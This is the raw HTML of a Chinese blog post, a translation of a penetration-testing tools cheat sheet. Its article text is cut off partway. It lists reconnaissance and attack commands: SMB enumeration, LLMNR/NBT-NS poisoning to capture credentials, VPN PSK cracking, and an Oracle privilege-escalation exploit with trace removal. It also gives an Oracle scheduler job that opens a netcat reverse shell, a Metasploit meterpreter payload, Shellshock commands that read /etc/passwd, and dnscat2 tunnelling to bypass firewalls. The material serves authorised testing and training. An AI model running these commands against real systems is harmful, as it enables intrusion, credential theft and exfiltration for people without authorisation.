<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>【译】渗透测试工具备忘录 | 闲言语</title><meta name=keywords content><meta name=description content="渗透测试工具备忘录 本文翻译自 Penetration Testing Tools Cheat Sheet ，首发先知社区 ，转载请注明链接。
简介 渗透测试工具备忘录记录渗透测试时常用的命令，更深入的信息推荐参考特定工具的帮助文档或 本站 其他备忘录。
本目录关注网络底层相关的渗透测试，除了少量sqlmap的命令和一些Web服务枚举外，基本不包含Web应用渗透测试的内容。关于Web应用测试，建议参考《黑客攻防技术宝典》，这本书不管是用作专门学习还是参考手册都是很棒的。
文中缺漏之处欢迎 推特 私戳。
更新日志： 17/02/2017 ：更新文章，增加VPN，DNS隧道，VLAN hopping（跳跃攻击） 等内容。
开始前 网络配置 设置IP 地址 1 ifconfig eth0 xxx.xxx.xxx.xxx/24 子网划分 1 2 ipcalc xxx.xxx.xxx.xxx/24 ipcalc xxx.xxx.xxx.xxx 255.255.255.0 公开来源情报 被动信息收集 DNS WHOIS 枚举 1 whois domain-name-here.com 查询DNS IP 1 dig a domain-name-here.com @nameserver 查询MX记录 1 dig mx domain-name-here.com @nameserver 用DIG 查询域传送 1 dig axfr domain-name-here.com @nameserver DNS 域传送 命令 解释 nslookup -> set type=any -> ls -d blah."><meta name=author content><link rel=canonical href=https://ret2neo.cn/post/180727penetrationtool/><link crossorigin=anonymous href=/assets/css/stylesheet.42b1e004fb78db2fc933d33c9db659598f62453f0de6f9db50c85e5936c0d8c3.css integrity="sha256-QrHgBPt42y/JM9M8nbZZWY9iRT8N5vnbUMheWTbA2MM=" rel="preload stylesheet" as=style><script defer crossorigin=anonymous src=/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG+9vmJ0cTS+ovo0FeA=" onload=hljs.initHighlightingOnLoad()></script>
<link rel=icon href=https://ret2neo.cn/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://ret2neo.cn/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://ret2neo.cn/favicon-32x32.png><link rel=apple-touch-icon href=https://ret2neo.cn/apple-touch-icon.png><link rel=mask-icon href=https://ret2neo.cn/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--hljs-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:title" content="【译】渗透测试工具备忘录"><meta property="og:description" content="渗透测试工具备忘录 本文翻译自 Penetration Testing Tools Cheat Sheet ，首发先知社区 ，转载请注明链接。
简介 渗透测试工具备忘录记录渗透测试时常用的命令，更深入的信息推荐参考特定工具的帮助文档或 本站 其他备忘录。
本目录关注网络底层相关的渗透测试，除了少量sqlmap的命令和一些Web服务枚举外，基本不包含Web应用渗透测试的内容。关于Web应用测试，建议参考《黑客攻防技术宝典》，这本书不管是用作专门学习还是参考手册都是很棒的。
文中缺漏之处欢迎 推特 私戳。
更新日志： 17/02/2017 ：更新文章，增加VPN，DNS隧道，VLAN hopping（跳跃攻击） 等内容。
开始前 网络配置 设置IP 地址 1 ifconfig eth0 xxx.xxx.xxx.xxx/24 子网划分 1 2 ipcalc xxx.xxx.xxx.xxx/24 ipcalc xxx.xxx.xxx.xxx 255.255.255.0 公开来源情报 被动信息收集 DNS WHOIS 枚举 1 whois domain-name-here.com 查询DNS IP 1 dig a domain-name-here.com @nameserver 查询MX记录 1 dig mx domain-name-here.com @nameserver 用DIG 查询域传送 1 dig axfr domain-name-here.com @nameserver DNS 域传送 命令 解释 nslookup -> set type=any -> ls -d blah."><meta property="og:type" content="article"><meta property="og:url" content="https://ret2neo.cn/post/180727penetrationtool/"><meta property="article:section" content="post"><meta property="article:published_time" content="2018-07-25T15:01:56+08:00"><meta property="article:modified_time" content="2018-07-25T15:01:56+08:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="【译】渗透测试工具备忘录"><meta name=twitter:description content="渗透测试工具备忘录 本文翻译自 Penetration Testing Tools Cheat Sheet ，首发先知社区 ，转载请注明链接。
简介 渗透测试工具备忘录记录渗透测试时常用的命令，更深入的信息推荐参考特定工具的帮助文档或 本站 其他备忘录。
本目录关注网络底层相关的渗透测试，除了少量sqlmap的命令和一些Web服务枚举外，基本不包含Web应用渗透测试的内容。关于Web应用测试，建议参考《黑客攻防技术宝典》，这本书不管是用作专门学习还是参考手册都是很棒的。
文中缺漏之处欢迎 推特 私戳。
更新日志： 17/02/2017 ：更新文章，增加VPN，DNS隧道，VLAN hopping（跳跃攻击） 等内容。
开始前 网络配置 设置IP 地址 1 ifconfig eth0 xxx.xxx.xxx.xxx/24 子网划分 1 2 ipcalc xxx.xxx.xxx.xxx/24 ipcalc xxx.xxx.xxx.xxx 255.255.255.0 公开来源情报 被动信息收集 DNS WHOIS 枚举 1 whois domain-name-here.com 查询DNS IP 1 dig a domain-name-here.com @nameserver 查询MX记录 1 dig mx domain-name-here.com @nameserver 用DIG 查询域传送 1 dig axfr domain-name-here.com @nameserver DNS 域传送 命令 解释 nslookup -> set type=any -> ls -d blah."><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://ret2neo.cn/post/"},{"@type":"ListItem","position":2,"name":"【译】渗透测试工具备忘录","item":"https://ret2neo.cn/post/180727penetrationtool/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"【译】渗透测试工具备忘录","name":"【译】渗透测试工具备忘录","description":"渗透测试工具备忘录 本文翻译自 Penetration Testing Tools Cheat Sheet ，首发先知社区 ，转载请注明链接。\n简介 渗透测试工具备忘录记录渗透测试时常用的命令，更深入的信息推荐参考特定工具的帮助文档或 本站 其他备忘录。\n本目录关注网络底层相关的渗透测试，除了少量sqlmap的命令和一些Web服务枚举外，基本不包含Web应用渗透测试的内容。关于Web应用测试，建议参考《黑客攻防技术宝典》，这本书不管是用作专门学习还是参考手册都是很棒的。\n文中缺漏之处欢迎 推特 私戳。\n更新日志： 17/02/2017 ：更新文章，增加VPN，DNS隧道，VLAN hopping（跳跃攻击） 等内容。\n开始前 网络配置 设置IP 地址 1 ifconfig eth0 xxx.xxx.xxx.xxx/24 子网划分 1 2 ipcalc xxx.xxx.xxx.xxx/24 ipcalc xxx.xxx.xxx.xxx 255.255.255.0 公开来源情报 被动信息收集 DNS WHOIS 枚举 1 whois domain-name-here.com 查询DNS IP 1 dig a domain-name-here.com @nameserver 查询MX记录 1 dig mx domain-name-here.com @nameserver 用DIG 查询域传送 1 dig axfr domain-name-here.com @nameserver DNS 域传送 命令 解释 nslookup -\u0026gt; set type=any -\u0026gt; ls -d blah.","keywords":[],"articleBody":"渗透测试工具备忘录 本文翻译自 Penetration Testing Tools Cheat Sheet ，首发先知社区 ，转载请注明链接。\n简介 渗透测试工具备忘录记录渗透测试时常用的命令，更深入的信息推荐参考特定工具的帮助文档或 本站 其他备忘录。\n本目录关注网络底层相关的渗透测试，除了少量sqlmap的命令和一些Web服务枚举外，基本不包含Web应用渗透测试的内容。关于Web应用测试，建议参考《黑客攻防技术宝典》，这本书不管是用作专门学习还是参考手册都是很棒的。\n文中缺漏之处欢迎 推特 私戳。\n更新日志： 17/02/2017 ：更新文章，增加VPN，DNS隧道，VLAN hopping（跳跃攻击） 等内容。\n开始前 网络配置 设置IP 地址 1 ifconfig eth0 xxx.xxx.xxx.xxx/24 子网划分 1 2 ipcalc xxx.xxx.xxx.xxx/24 ipcalc xxx.xxx.xxx.xxx 255.255.255.0 公开来源情报 被动信息收集 DNS WHOIS 枚举 1 whois domain-name-here.com 查询DNS IP 1 dig a domain-name-here.com @nameserver 查询MX记录 1 dig mx domain-name-here.com @nameserver 用DIG 查询域传送 1 dig axfr domain-name-here.com @nameserver DNS 域传送 命令 解释 nslookup -\u003e set type=any -\u003e ls -d blah.com Windows DNS域传送 dig axfr blah.com @ns1.blah.com Linux DNS 域传送 邮件 Simply Email 使用Simply Email枚举所有所有网站（GitHub，目标站点等），配上代理或设置较长的访问间隔时间，这样就不会被Google发现是爬虫并用验证码拦住了。Simply Email还可以验证收集的邮件地址。\n1 2 git clone https://github.com/killswitch-GUI/SimplyEmail.git ./SimplyEmail.py -all -e TARGET-DOMAIN 半主动信息收集 基本指纹识别 手动指纹识别/banner抓取\n命令 解释 nc -v 192.168.1.1 25 telnet 192.168.1.1 25 通过显示banner识别版本和指纹 使用NC抓取banner 1 2 3 4 5 6 nc TARGET-IP 80 GET / HTTP/1.1 Host: TARGET-IP User-Agent: Mozilla/5.0 Referrer: meh-domain 主动信息收集 DNS 爆破 DNSRecon DNS Enumeration Kali - DNSRecon root :~# dnsrecon -d TARGET -D /usr/share/wordlists/dnsmap.txt -t std –xml ouput.xml 端口扫描 Nmap命令 更多命令，详见 Nmap备忘录 。\n基本Nmap 命令：\n命令 解释 nmap -v -sS -A -T4 target 详细显示，syn探测，高速扫描，系统和服务版本信息，脚本扫描和路由跟踪 nmap -v -sS -p--A -T4 target 同上，且扫描所有TCP端口，耗时更长 nmap -v -sU -sS -p- -A -T4 target 同上，且扫描所有UDP端口，耗时巨长 nmap -v -p 445 --script=smb-check-vulns --script-args=unsafe=1 192.168.1.X 扫描可能包含漏洞的SMB服务 ` ls /usr/share/nmap/scripts/* grep ftp ` 别在外网采用T4 扫描，使用TCP 连接扫描时用T2 比较合适。T4 扫描用在低延迟高带宽的内部网络测试会更合适。但这也取决于目标设备，如果用T4/T5 扫他们，结果就可能不准确。总的来说，扫描越慢越好，也可以先快速扫描1000个目标方便上手测试，然后再慢慢扫其余的。\nNmap UDP扫描 1 nmap -sU TARGET UDP 协议扫描器 1 git clone https://github.com/portcullislabs/udp-proto-scanner.git 扫描文件中IP地址的所有服务\n1 ./udp-protocol-scanner.pl -f ip.txt 扫描特定UDP服务\n1 udp-proto-scanner.pl -p ntp -f ips.txt 其他主机发现 不使用nmap发现主机的方法：\n命令 解释 netdiscover -r 192.168.1.0/24 利用子网的地址解析协议发现同网段的IP，MAC地址和MAC厂商 枚举和攻击网络服务 用于识别/枚举网络服务的工具。\nSAMB / SMB / Windows 域枚举 Samba枚举 SMB枚举工具 1 2 3 4 nmblookup -A target smbclient //MOUNT/share -I target -N rpcclient -U \"\" target enum4linux target 当然也可参考本站的 nbtscan 的速查表\nSMB 版本指纹识别 1 smbclient -L //192.168.1.100 寻找开放的SMB共享 1 nmap -T4 -v -oA shares --script smb-enum-shares --script-args smbuser=username,smbpass=password -p445 192.168.1.0/24 枚举SMB用户 1 nmap -sU -sS --script=smb-enum-users -p U:137,T:139 192.168.11.200-254 1 python /usr/share/doc/python-impacket-doc/examples/samrdump.py 192.168.XXX.XXX RID循环（RID Cycling ）\n1 ridenum.py 192.168.XXX.XXX 500 50000 dict.txt Metasploit的RID循环攻击模块\n1 use auxiliary/scanner/smb/smb_lookupsid 手动测试空会话 1 2 3 4 5 Windows: net use \\\\TARGET\\IPC$ \"\" /u:\"\" Linux: smbclient -L //192.168.99.131 NBTScan unixwiz 在Kali上安装使用：\n1 2 apt-get install nbtscan-unixwiz nbtscan-unixwiz -f 192.168.0.1-254 \u003e nbtscan LLMNR / NBT-NS欺骗 从网络中窃取凭证\n使用Metasploit进行 LLMNR / NetBIOS请求 欺骗/毒化 LLMNR / NetBIOS请求：\n1 2 auxiliary/spoof/llmnr/llmnr_response auxiliary/spoof/nbns/nbns_response 抓取哈希\n1 2 auxiliary/server/capture/smb auxiliary/server/capture/http_ntlm 最后会得到NTLMv2 哈希，可以使用john或者hashcat破解。\nResponder.py 你也可以选择使用 responder\n1 2 git clone https://github.com/SpiderLabs/Responder.git python Responder.py -i local-ip -I eth0 注：整个渗透测试过程可以一直允许Responder.py\nSNMP枚举工具 SNMP枚举工具有很多。\n美化SNMP输出结果使易于阅读。\n1 2 apt-get install snmp-mibs-downloader download-mibs echo \"\" \u003e /etc/snmp/snmp.conf 命令 解释 snmpcheck -t 192.168.1.X -c public` snmpwalk -c public -v1 192.168.1.X 1 grep hrSWRunName SNMPv3枚举工具 使用nmap识别SNMPv3服务器\n1 nmap -sV -p 161 --script=snmp-info TARGET-SUBNET Rory McCune 的脚本可以帮助自动化枚举SNMPv3的用户名枚举。\n1 2 apt-get install snmp snmp-mibs-downloader wget https://raw.githubusercontent.com/raesene/TestingScripts/master/snmpv3enum.rb 注意：下面的路径是Kali上Metasploit的SNMP v1和v2的攻击字典，更新的字典可以参考Daniel Miessler 在GitHub上的安全列表 。\n1 /usr/share/metasploit-framework/data/wordlists/snmp_default_pass.txt 远程服务枚举 这已是老生常谈，但为了本文内容的全面还是包含如下。\nnmap -A 会进行下面列举的所有远程服务的枚举，所以这里只是顺便提及。\nRSH 枚举 RSH运行命令 1 rsh MetasploitRSH 登陆扫描 1 auxiliary/scanner/rservices/rsh_login 使用rusers显示已登陆用户 1 rusers -al 192.168.2.1 使用rlogin扫描整个子网 1 2 rlogin -l e.g rlogin -l root TARGET-SUBNET/24 使用finger枚举 1 2 finger @TARGET-IP finger batman@TARGET-IP 利用Solaris的bug显示所有已登录用户 1 2 3 4 5 6 finger 0@host SunOS: RPC services allow user enum: $ rusers # users logged onto LAN finger 'a b c d e f g h'@sunhost rwho 使用nmap识别运行rwhod服务（513端口，UDP协议）的机器。\nTLS\u0026SSL 测试 testssl.sh 测试单一主机并将结果输出的HTML文件：\n1 ./testssl.sh -e -E -f -p -y -Y -S -P -c -H -U TARGET-HOST | aha \u003e OUTPUT-FILE.html 漏洞评估 在Kali Rolling上安装OpenVAS 8\n1 2 3 4 apt-get update apt-get dist-upgrade -y apt-get install openvas openvas-setup 确认openvas 正在运行：\n1 netstat -tulpn 通过https://127.0.0.1:9392 登陆openvas，密码是在安装时设置好的。\n数据库渗透测试 攻击暴露在互联网上的数据库。\nOracle 安装 oscanner：\n1 apt-get install oscanner 运行 oscanner：\n1 oscanner -s 192.168.1.200 -P 1521 Oracle TNS版本指纹识别 安装 tnscmd10g ：\n1 apt-get install tnscmd10g 识别：\n1 2 tnscmd10g version -h TARGET nmap --script=oracle-tns-version 爆破Oracle账户 验证默认账户\n1 2 nmap --script=oracle-sid-brute nmap --script=oracle-brute 对Oracle TNS 运行nmap脚本：\n1 nmap -p 1521 -A TARGET Oracle权限提升 利用条件：\nOracle必须暴露在互联网上 使用默认账户，如scott 简明流程：\n创建函数 创建表 SYS.DUAL 的索引 刚刚建立的索引执行了SCOTT.DBA_X 函数 函数是被SYS用户执行的，因为表 SYS.DUAL 属于SYS用户 创建具有DBA权限的账户 下面的展示使用SCOTT用户，但其他默认的Oracle用户也是可以的。\n使用NMAP NSE脚本验证oracle数据库中的默认账户： 1 2 nmap --script=oracle-sid-brute nmap --script=oracle-brute 使用脆弱账号登陆（假设你发现了一个）。\n确认一个oracle用户的权限级别 1 2 3 4 5 6 7 8 9 10 SQL\u003e select * from session_privs; SQL\u003e CREATE OR REPLACE FUNCTION GETDBA(FOO varchar) return varchar deterministic authid curren_user is pragma autonomous_transaction; begin execute immediate 'grant dba to user1 identified by pass1'; commit; return 'FOO'; end; Oracle权限提升和访问DBA 运行netcat，netcat -nvlp 443 。\n1 SQL\u003e create index exploit_1337 on SYS.DUAL(SCOTT.GETDBA('BAR')); 运行查询语句 1 SQL\u003e Select * from session_privs; 这时你应该拥有一个DBA用户，可以重新运行上面的命令来验证自己是否拥有DBA特权。\n移除利用痕迹： 1 drop index exploit_1337; 获取Oracle反弹shell： 1 2 3 4 5 6 7 8 9 10 begin dbms_scheduler.create_job( job_name =\u003e 'MEH1337',job_type =\u003e 'EXECUTABLE',job_action =\u003e '/bin/nc',number_of_arguments =\u003e 4,start_date =\u003e SYSTIMESTAMP,enabled =\u003e FALSE,auto_drop =\u003e TRUE); dbms_scheduler.set_job_argument_value('rev_shell', 1, 'TARGET-IP'); dbms_scheduler.set_job_argument_value('rev_shell', 2, '443'); dbms_scheduler.set_job_argument_value('rev_shell', 3, '-e'); dbms_scheduler.set_job_argument_value('rev_shell', 4, '/bin/bash'); dbms_scheduler.enable('rev_shell'); end; MSSQL 枚举/发现\nNmap\n1 nmap -sU --script=ms-sql-info 192.168.1.108 192.168.1.156 Metasploit\n1 msf \u003e use auxiliary/scanner/mssql/mssql_ping 爆破 MSSQL登陆 1 msf \u003e use auxiliary/admin/mssql/mssql_enum Metasploit MSSQL Shell 1 2 msf \u003e use exploit/windows/mssql/mssql_payload msf exploit(mssql_payload) \u003e set PAYLOAD windows/meterpreter/reverse_tcp 网络 Plink.exe 隧道 PuTTY Link 隧道\n转发运程端口到本地地址：\n1 plink.exe -P 22 -l root -pw \"1337\" -R 445:127.0.0.1:445 REMOTE-IP 跳板（Pivoting） SSH 跳板（ssh Pivoting） 1 ssh -D 127.0.0.1:1010 -p 22 user@pivot-target-ip 需在 /etc/proxychains.conf 添加sock4 127.0.0.1 1010\n利用SSH跳板跨越网络\n1 ssh -D 127.0.0.1:1010 -p 22 user1@ip-address-1 需在 /etc/proxychains.conf 添加sock4 127.0.0.1 1010\n1 proxychains ssh -D 127.0.0.1:1011 -p 22 user1@ip-address-2 在 /etc/proxychains.conf 添加sock4 127.0.0.1 1011\nMeterpreter Pivoting TTL 指纹识别 操作系统 TTL 值 Windows 128 Linux 64 Solaris 255 Cisco / Network 255 IPv4 速查 各类IP的地址范围 类别 IP 地址范围 A类 0.0.0.0 - 127.255.255.255 B类 128.0.0.0 - 191.255.255.255 C类 192.0.0.0 - 223.255.255.255 D类 224.0.0.0 - 239.255.255.255 E类 240.0.0.0 - 255.255.255.255 IPv4私有地址 类别 范围 A类私有地址 10.0.0.0 - 10.255.255.255 B类私有地址 172.16.0.0 - 172.31.255.255 C类私有地址 192.168.0.0 - 192.168.255.255 127.0.0.0 - 127.255.255.255 IPv4子网速查表 和渗透测试关系不太大，但确实很有用。\nCIDR 十进制掩码 主机数量 /31 255.255.255.254 1 Host /30 255.255.255.252 2 Hosts /29 255.255.255.249 6 Hosts /28 255.255.255.240 14 Hosts /27 255.255.255.224 30 Hosts /26 255.255.255.192 62 Hosts /25 255.255.255.128 126 Hosts /24 255.255.255.0 254 Hosts /23 255.255.254.0 512 Host /22 255.255.252.0 1022 Hosts /21 255.255.248.0 2046 Hosts /20 255.255.240.0 4094 Hosts /19 255.255.224.0 8190 Hosts /18 255.255.192.0 16382 Hosts /17 255.255.128.0 32766 Hosts /16 255.255.0.0 65534 Hosts /15 255.254.0.0 131070 Hosts /14 255.252.0.0 262142 Hosts /13 255.248.0.0 524286 Hosts /12 255.240.0.0 1048674 Hosts /11 255.224.0.0 2097150 Hosts /10 255.192.0.0 4194302 Hosts /9 255.128.0.0 8388606 Hosts /8 255.0.0.0 16777214 Hosts VLAN hopping（跳跃攻击） 使用nccgroup 的脚本简化攻击过程\n1 2 3 git clone https://github.com/nccgroup/vlan-hopping.git chmod 700 frogger.sh ./frogger.sh VPN测试工具 识别VPN服务器\n1 ./udp-protocol-scanner.pl -p ike TARGET(s) 扫描VPN服务器网段：\n1 ./udp-protocol-scanner.pl -p ike -f ip.txt IKEForce 使用IKEForce枚举或对 VPN 服务器进行字典攻击.\n安装:\n1 2 pip install pyip git clone https://github.com/SpiderLabs/ikeforce.git 使用IKEForce对IKE VPN 进行枚举：\n1 ./ikeforce.py TARGET-IP –e –w wordlists/groupnames.dic 使用 IKEForce 爆破 IKE VPN:\n1 ./ikeforce.py TARGET-IP -b -i groupid -u dan -k psk123 -w passwords.txt -s 1 1 2 3 4 ike-scan ike-scan TARGET-IP ike-scan -A TARGET-IP ike-scan -A TARGET-IP --id=myid -P TARGET-IP-key IKE 激进模式 PSK 破解 验证VPN服务器 使用 IKEForce 枚举来获得组ID 使用 ike-scan 从IKE 终端抓取 PSK 哈希 使用 psk-crack 破解哈希 Step 1: 验证IKE服务器 1 ./udp-protocol-scanner.pl -p ike SUBNET/24 Step 2:使用IKEForce枚举组名 1 ./ikeforce.py TARGET-IP –e –w wordlists/groupnames.dic Step 3: 使用ike-scan抓取PSK哈希 1 ike-scan –M –A –n example_group -P hash-file.txt TARGET-IP Step 4: 使用psk-crack 破解PSK 哈希 1 psk-crack hash-file.txt 高级psk-crack 选项:\n1 2 3 4 pskcrack psk-crack -b 5 TARGET-IPkey psk-crack -b 5 --charset=\"01233456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz\" 192-168-207-134key psk-crack -d /path/to/dictionary-file TARGET-IP-key PPTP Hacking 验证PPTP服务 ，它以TCP协议在1723端口监听\nNMAP PPTP 指纹识别: 1 nmap –Pn -sV -p 1723 TARGET(S) PPTP字典攻击 1 thc-pptp-bruter -u hansolo -W -w /usr/share/wordlists/nmap.lst DNS 隧道 通过DNS传送数据来绕过防火墙。dns2cat支持和目标主机间 的上传和下载文件（数据或程序）操作。\n攻击机器： 安装:\n1 2 3 4 5 6 apt-get update apt-get -y install ruby-dev git make g++ gem install bundler git clone https://github.com/iagox86/dnscat2.git cd dnscat2/server bundle install 运行dnscat2:\n1 2 3 ruby ./dnscat2.rb dnscat2\u003e New session established: 1422 dnscat2\u003e session -i 1422 目标机器:\nhttps://downloads.skullsecurity.org/dnscat2/\nhttps://github.com/lukebaggett/dnscat2-powershell/\n1 dnscat --host BOF / Exploit Exploit 搜索 寻找枚举主机/服务的exp\n命令 解释 `searchsploit windows 2003 grep -i local` site:exploit-db.com exploit kernel \u003c= 3 使用Google搜索exploit-db.com grep -R \"W7\" /usr/share/metasploit-framework/modules/exploit/windows/* 用grep搜索metasploit的模块——因为msf的搜索有点差劲。 搜索EXP 安装exploit-db的本地备份:\n1 2 3 4 searchsploit –u searchsploit apache 2.2 searchsploit \"Linux Kernel\" searchsploit linux 2.6 | grep -i ubuntu | grep local 在Kali上编译WIndows的exp 1 2 3 4 5 6 7 8 wget -O mingw-get-setup.exe http://sourceforge.net/projects/mingw/files/Installer/mingw-get-setup.exe/download wine mingw-get-setup.exe select mingw32-base cd /root/.wine/drive_c/windows wget http://gojhonny.com/misc/mingw_bin.zip \u0026\u0026 unzip mingw_bin.zip cd /root/.wine/drive_c/MinGW/bin wine gcc -o ability.exe /tmp/exploit.c -lwsock32 wine ability.exe 交叉编译Exploits 1 2 gcc -m32 -o output32 hello.c (32 bit) gcc -m64 -o output hello.c (64 bit) 利用通用漏洞 利用Shellshock漏洞 一个用来寻找和利用Shellshock漏洞的攻击\n1 git clone https://github.com/nccgroup/shocker 1 ./shocker.py -H TARGET --command \"/bin/cat /etc/passwd\" -c /cgi-bin/status --verbose cat file (查看文件内容) 1 echo -e \"HEAD /cgi-bin/status HTTP/1.1\\r\\nUser-Agent: () { :;}; echo \\$(","wordCount":"2507","inLanguage":"en","datePublished":"2018-07-25T15:01:56+08:00","dateModified":"2018-07-25T15:01:56+08:00","mainEntityOfPage":{"@type":"WebPage","@id":"https://ret2neo.cn/post/180727penetrationtool/"},"publisher":{"@type":"Organization","name":"闲言语","logo":{"@type":"ImageObject","url":"https://ret2neo.cn/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://ret2neo.cn/ accesskey=h title="闲言语 (Alt + H)">闲言语</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://ret2neo.cn/mind/ title=随笔><span>随笔</span></a></li><li><a href=https://ret2neo.cn/about title=关于><span>关于</span></a></li><li><a href=https://ret2neo.cn/search title="搜索 (Alt + /)" accesskey=/><span>搜索</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><h1 class=post-title>【译】渗透测试工具备忘录</h1><div class=post-meta><span title='2018-07-25 15:01:56 +0800 CST'>July 25, 2018</span>&nbsp;|&nbsp;<a href=https://github.dev/findneo/priblog/content/post/180727penetrationtool.md rel="noopener noreferrer" target=_blank>edit</a></div></header><aside id=toc-container class="toc-container wide"><div class=toc><details open><summary accesskey=c title="(Alt + C)"><span class=details>目录</span></summary><div class=inner><ul><li><a href=#%e6%b8%97%e9%80%8f%e6%b5%8b%e8%af%95%e5%b7%a5%e5%85%b7%e5%a4%87%e5%bf%98%e5%bd%95 aria-label=渗透测试工具备忘录>渗透测试工具备忘录</a><ul><li><a href=#%e7%ae%80%e4%bb%8b aria-label=简介>简介</a><ul><li><a href=#%e6%9b%b4%e6%96%b0%e6%97%a5%e5%bf%97 aria-label=更新日志：>更新日志：</a></li></ul></li><li><a href=#%e5%bc%80%e5%a7%8b%e5%89%8d aria-label=开始前>开始前</a><ul><li><a href=#%e7%bd%91%e7%bb%9c%e9%85%8d%e7%bd%ae aria-label=网络配置>网络配置</a><ul><li><a href=#%e8%ae%be%e7%bd%aeip-%e5%9c%b0%e5%9d%80 aria-label="设置IP 地址">设置IP 地址</a></li><li><a href=#%e5%ad%90%e7%bd%91%e5%88%92%e5%88%86 aria-label=子网划分>子网划分</a></li></ul></li></ul></li><li><a href=#%e5%85%ac%e5%bc%80%e6%9d%a5%e6%ba%90%e6%83%85%e6%8a%a5 aria-label=公开来源情报>公开来源情报</a><ul><li><a href=#%e8%a2%ab%e5%8a%a8%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86 aria-label=被动信息收集>被动信息收集</a><ul><li><a href=#dns aria-label=DNS>DNS</a><ul><li><a href=#whois-%e6%9e%9a%e4%b8%be aria-label="WHOIS 枚举">WHOIS 枚举</a></li><li><a href=#%e6%9f%a5%e8%af%a2dns-ip aria-label="查询DNS IP">查询DNS IP</a></li><li><a href=#%e6%9f%a5%e8%af%a2mx%e8%ae%b0%e5%bd%95 aria-label=查询MX记录>查询MX记录</a></li><li><a href=#%e7%94%a8dig-%e6%9f%a5%e8%af%a2%e5%9f%9f%e4%bc%a0%e9%80%81 aria-label="用DIG 查询域传送">用DIG 查询域传送</a></li></ul></li></ul></li></ul></li><li><a href=#dns-%e5%9f%9f%e4%bc%a0%e9%80%81 aria-label="DNS 域传送">DNS 域传送</a><ul><li><a href=#%e9%82%ae%e4%bb%b6 aria-label=邮件>邮件</a><ul><li><a href=#simply-email aria-label="Simply Email">Simply Email</a></li></ul></li><li><a href=#%e5%8d%8a%e4%b8%bb%e5%8a%a8%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86 aria-label=半主动信息收集>半主动信息收集</a><ul><li><a href=#%e5%9f%ba%e6%9c%ac%e6%8c%87%e7%ba%b9%e8%af%86%e5%88%ab aria-label=基本指纹识别>基本指纹识别</a></li><li><a href=#%e4%bd%bf%e7%94%a8nc%e6%8a%93%e5%8f%96banner aria-label=使用NC抓取banner>使用NC抓取banner</a></li></ul></li><li><a href=#%e4%b8%bb%e5%8a%a8%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86 aria-label=主动信息收集>主动信息收集</a><ul><li><a href=#dns-%e7%88%86%e7%a0%b4 aria-label="DNS 爆破">DNS 爆破</a><ul><li><a href=#dnsrecon aria-label=DNSRecon>DNSRecon</a></li></ul></li><li><a href=#%e7%ab%af%e5%8f%a3%e6%89%ab%e6%8f%8f aria-label=端口扫描>端口扫描</a><ul><li><a href=#nmap%e5%91%bd%e4%bb%a4 aria-label=Nmap命令>Nmap命令</a><ul><li><a href=#nmap-udp%e6%89%ab%e6%8f%8f aria-label="Nmap UDP扫描">Nmap UDP扫描</a></li><li><a href=#udp-%e5%8d%8f%e8%ae%ae%e6%89%ab%e6%8f%8f%e5%99%a8 aria-label="UDP 协议扫描器">UDP 协议扫描器</a></li><li><a href=#%e5%85%b6%e4%bb%96%e4%b8%bb%e6%9c%ba%e5%8f%91%e7%8e%b0 aria-label=其他主机发现>其他主机发现</a></li></ul></li></ul></li></ul></li></ul></li><li><a href=#%e6%9e%9a%e4%b8%be%e5%92%8c%e6%94%bb%e5%87%bb%e7%bd%91%e7%bb%9c%e6%9c%8d%e5%8a%a1 aria-label=枚举和攻击网络服务>枚举和攻击网络服务</a><ul><li><a href=#samb--smb--windows-%e5%9f%9f%e6%9e%9a%e4%b8%be 